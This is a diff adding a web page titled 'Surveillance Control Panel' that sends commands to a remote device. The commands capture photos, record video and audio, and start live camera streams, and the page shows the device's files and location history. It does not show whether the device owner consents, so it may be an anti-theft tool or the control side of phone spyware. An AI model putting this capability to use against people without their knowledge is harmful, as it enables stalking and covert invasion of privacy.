@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Surveillance Control Panel</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body { padding: 20px; }
+        .section { margin-bottom: 20px; }
+        .hidden { display: none; }
+        #map { height: 300px; margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Login Section -->
+        <div id="auth-section" class="section">
+            <h2>Login</h2>
+            <div class="mb-3">
+                <label for="email" class="form-label">Email</label>
+                <input type="email" class="form-control" id="email" placeholder="Enter email">
+            </div>
+            <div class="mb-3">
+                <label for="password" class="form-label">Password</label>
+                <input type="password" class="form-control" id="password" placeholder="Enter password">
+            </div>
+            <button class="btn btn-primary" onclick="login()">Login</button>
+            <button class="btn btn-secondary" onclick="logout()" id="logout-btn" style="display: none;">Logout</button>
+            <p id="auth-error" class="text-danger"></p>
+        </div>
+
+        <!-- Command Section -->
+        <div id="command-section" class="section hidden">
+            <h2>Send Command</h2>
+            <form id="command-form">
+                <div class="mb-3">
+                    <label for="command-type" class="form-label">Command Type</label>
+                    <select class="form-select" id="command-type" onchange="updateCommandForm()">
+                        <option value="capturePhoto">Capture Photo</option>
+                        <option value="recordVideo">Record Video</option>
+                        <option value="recordAudio">Record Audio</option>
+                        <option value="startStreaming">Start Streaming</option>
+                        <option value="ringAndVibrate">Ring and Vibrate</option>
+                        <option value="files">List Files</option>
+                    </select>
+                </div>
+                <!-- Dynamic fields -->
+                <div id="capturePhoto-fields">
+                    <div class="mb-3">
+                        <label for="photo-camera" class="form-label">Camera</label>
+                        <select class="form-select" id="photo-camera">
+                            <option value="back">Back</option>
+                            <option value="front">Front</option>
+                        </select>
+                    </div>
+                    <div class="mb-3">
+                        <label for="photo-flash" class="form-label">Flash</label>
+                        <select class="form-select" id="photo-flash">
+                            <option value="true">On</option>
+                            <option value="false">Off</option>
+                        </select>
+                    </div>
+                </div>
+                <div id="recordVideo-fields" class="hidden">
+                    <div class="mb-3">
+                        <label for="video-camera" class="form-label">Camera</label>
+                        <select class="form-select" id="video-camera">
+                            <option value="back">Back</option>
+                            <option value="front">Front</option>
+                        </select>
+                    </div>
+                    <div class="mb-3">
+                        <label for="video-quality" class="form-label">Quality</label>
+                        <select class="form-select" id="video-quality">
+                            <option value="480p">480p</option>
+                            <option value="720p">720p</option>
+                            <option value="1080p">1080p</option>
+                        </select>
+                    </div>
+                    <div class="mb-3">
+                        <label for="video-duration" class="form-label">Duration (seconds)</label>
+                        <input type="number" class="form-control" id="video-duration" value="10">
+                    </div>
+                </div>
+                <div id="recordAudio-fields" class="hidden">
+                    <div class="mb-3">
+                        <label for="audio-duration" class="form-label">Duration (seconds)</label>
+                        <input type="number" class="form-control" id="audio-duration" value="10">
+                    </div>
+                </div>
+                <div id="startStreaming-fields" class="hidden">
+                    <div class="mb-3">
+                        <label for="stream-type" class="form-label">Stream Type</label>
+                        <select class="form-select" id="stream-type">
+                            <option value="rtmp">RTMP</option>
+                            <option value="webrtc">WebRTC</option>
+                        </select>
+                    </div>
+                    <div class="mb-3">
+                        <label for="stream-camera" class="form-label">Camera</label>
+                        <select class="form-select" id="stream-camera">
+                            <option value="back">Back</option>
+                            <option value="front">Front</option>
+                        </select>
+                    </div>
+                </div>
+                <button type="submit" class="btn btn-primary">Send Command</button>
+            </form>
+        </div>
+
+        <!-- Commands Table -->
+        <div id="commands-table-section" class="section hidden">
+            <h2>Commands</h2>
+            <table class="table table-striped">
+                <thead>
+                    <tr>
+                        <th>ID</th>
+                        <th>Type</th>
+                        <th>Payload</th>
+                        <th>Created At</th>
+                    </tr>
+                </thead>
+                <tbody id="commands-table-body"></tbody>
+            </table>
+        </div>
+
+        <!-- Files Gallery -->
+        <div id="files-section" class="section hidden">
+            <h2>Files</h2>
+            <div class="row" id="files-gallery"></div>
+        </div>
+
+        <!-- Locations Table -->
+        <div id="locations-section" class="section hidden">
+            <h2>Locations</h2>
+            <table class="table table-striped">
+                <thead>
+                    <tr>
+                        <th>ID</th>
+                        <th>Latitude</th>
+                        <th>Longitude</th>
+                        <th>Timestamp</th>
+                    </tr>
+                </thead>
+                <tbody id="locations-table-body"></tbody>
+            </table>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        // Initialize Supabase client
+        const supabase = Supabase.createClient(
+            'https://yxdnyavcxouutwkvdoef.supabase.co', // Replace with your Supabase project URL
+            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl4ZG55YXZjeG91dXR3a3Zkb2VmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDcwNjE0MDQsImV4cCI6MjA2MjYzNzQwNH0.y07v2koScA07iztFr366pB5f5n5UCCzc_Agn228dujI' // Replace with your Supabase anon key
+        );
+
+        let user = null;
+
+        // Check auth state
+        async function checkAuth() {
+            const { data: { session } } = await supabase.auth.getSession();
+            user = session?.user ?? null;
+            updateUI();
+        }
+
+        // Login
+        async function login() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const { error } = await supabase.auth.signInWithPassword({ email, password });
+            if (error) {
+                document.getElementById('auth-error').textContent = error.message;
+            } else {
+                document.getElementById('auth-error').textContent = '';
+                user = (await supabase.auth.getUser()).data.user;
+                updateUI();
+            }
+        }
+
+        // Logout
+        async function logout() {
+            await supabase.auth.signOut();
+            user = null;
+            updateUI();
+        }
+
+        // Update UI based on auth state
+        function updateUI() {
+            const authSection = document.getElementById('auth-section');
+            const commandSection = document.getElementById('command-section');
+            const commandsTableSection = document.getElementById('commands-table-section');
+            const filesSection = document.getElementById('files-section');
+            const locationsSection = document.getElementById('locations-section');
+            const logoutBtn = document.getElementById('logout-btn');
+
+            if (user) {
+                authSection.querySelectorAll('input, button:not(#logout-btn)').forEach(el => el.style.display = 'none');
+                logoutBtn.style.display = 'inline-block';
+                commandSection.classList.remove('hidden');
+                commandsTableSection.classList.remove('hidden');
+                filesSection.classList.remove('hidden');
+                locationsSection.classList.remove('hidden');
+                loadCommands();
+                loadFiles();
+                loadLocations();
+                subscribeToChanges();
+            } else {
+                authSection.querySelectorAll('input, button:not(#logout-btn)').forEach(el => el.style.display = '');
+                logoutBtn.style.display = 'none';
+                commandSection.classList.add('hidden');
+                commandsTableSection.classList.add('hidden');
+                filesSection.classList.add('hidden');
+                locationsSection.classList.add('hidden');
+            }
+        }
+
+        // Update command form based on command type
+        function updateCommandForm() {
+            const commandType = document.getElementById('command-type').value;
+            document.getElementById('capturePhoto-fields').classList.add('hidden');
+            document.getElementById('recordVideo-fields').classList.add('hidden');
+            document.getElementById('recordAudio-fields').classList.add('hidden');
+            document.getElementById('startStreaming-fields').classList.add('hidden');
+
+            if (commandType === 'capturePhoto') {
+                document.getElementById('capturePhoto-fields').classList.remove('hidden');
+            } else if (commandType === 'recordVideo') {
+                document.getElementById('recordVideo-fields').classList.remove('hidden');
+            } else if (commandType === 'recordAudio') {
+                document.getElementById('recordAudio-fields').classList.remove('hidden');
+            } else if (commandType === 'startStreaming') {
+                document.getElementById('startStreaming-fields').classList.remove('hidden');
+            }
+        }
+
+        // Send command
+        document.getElementById('command-form').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const commandType = document.getElementById('command-type').value;
+            let payload = {};
+
+            if (commandType === 'capturePhoto') {
+                payload = {
+                    camera: document.getElementById('photo-camera').value,
+                    flash: document.getElementById('photo-flash').value === 'true'
+                };
+            } else if (commandType === 'recordVideo') {
+                payload = {
+                    camera: document.getElementById('video-camera').value,
+                    quality: document.getElementById('video-quality').value,
+                    duration: parseInt(document.getElementById('video-duration').value) * 1000
+                };
+            } else if (commandType === 'recordAudio') {
+                payload = {
+                    duration: parseInt(document.getElementById('audio-duration').value) * 1000
+                };
+            } else if (commandType === 'startStreaming') {
+                payload = {
+                    type: document.getElementById('stream-type').value,
+                    camera: document.getElementById('stream-camera').value
+                };
+            }
+
+            const { error } = await supabase.from('commands').insert({
+                type: commandType,
+                payload,
+                user_id: user.id
+            });
+
+            if (error) {
+                alert('Error sending command: ' + error.message);
+            } else {
+                alert('Command sent successfully');
+            }
+        });
+
+        // Load commands
+        async function loadCommands() {
+            const { data, error } = await supabase.from('commands')
+                .select('*')
+                .eq('user_id', user.id)
+                .order('created_at', { ascending: false })
+                .limit(50);
+            if (error) {
+                console.error('Error loading commands:', error);
+                return;
+            }
+            const tbody = document.getElementById('commands-table-body');
+            tbody.innerHTML = '';
+            data.forEach(command => {
+                const row = document.createElement('tr');
+                row.innerHTML = `
+                    <td>${command.id}</td>
+                    <td>${command.type}</td>
+                    <td>${JSON.stringify(command.payload)}</td>
+                    <td>${new Date(command.created_at).toLocaleString()}</td>
+                `;
+                tbody.appendChild(row);
+            });
+        }
+
+        // Load files
+        async function loadFiles() {
+            const { data, error } = await supabase.from('files')
+                .select('*')
+                .eq('user_id', user.id)
+                .order('created_at', { ascending: false })
+                .limit(50);
+            if (error) {
+                console.error('Error loading files:', error);
+                return;
+            }
+            const gallery = document.getElementById('files-gallery');
+            gallery.innerHTML = '';
+            data.forEach(file => {
+                const col = document.createElement('div');
+                col.className = 'col-md-4 mb-3';
+                const url = supabase.storage.from(file.bucket).getPublicUrl(file.path).data.publicUrl;
+                if (file.bucket === 'photos') {
+                    col.innerHTML = `
+                        <div class="card">
+                            <img src="${url}" class="card-img-top" alt="${file.name}">
+                            <div class="card-body">
+                                <h5 class="card-title">${file.name}</h5>
+                                <a href="${url}" class="btn btn-primary" download>Download</a>
+                            </div>
+                        </div>
+                    `;
+                } else {
+                    col.innerHTML = `
+                        <div class="card">
+                            <div class="card-body">
+                                <h5 class="card-title">${file.name}</h5>
+                                <a href="${url}" class="btn btn-primary" download>Download</a>
+                            </div>
+                        </div>
+                    `;
+                }
+                gallery.appendChild(col);
+            });
+        }
+
+        // Load locations
+        async function loadLocations() {
+            const { data, error } = await supabase.from('locations')
+                .select('*')
+                .eq('user_id', user.id)
+                .order('timestamp', { ascending: false })
+                .limit(50);
+            if (error) {
+                console.error('Error loading locations:', error);
+                return;
+            }
+            const tbody = document.getElementById('locations-table-body');
+            tbody.innerHTML = '';
+            data.forEach(location => {
+                const row = document.createElement('tr');
+                row.innerHTML = `
+                    <td>${location.id}</td>
+                    <td>${location.latitude}</td>
+                    <td>${location.longitude}</td>
+                    <td>${new Date(location.timestamp).toLocaleString()}</td>
+                `;
+                tbody.appendChild(row);
+            });
+        }
+
+        // Subscribe to real-time changes
+        function subscribeToChanges() {
+            supabase.channel('commands')
+                .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'commands', filter: `user_id=eq.${user.id}` }, () => {
+                    loadCommands();
+                })
+                .subscribe();
+
+            supabase.channel('files')
+                .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'files', filter: `user_id=eq.${user.id}` }, () => {
+                    loadFiles();
+                })
+                .subscribe();
+        }
+
+        // Initialize
+        checkAuth();
+    </script>
+</body>
+</html>
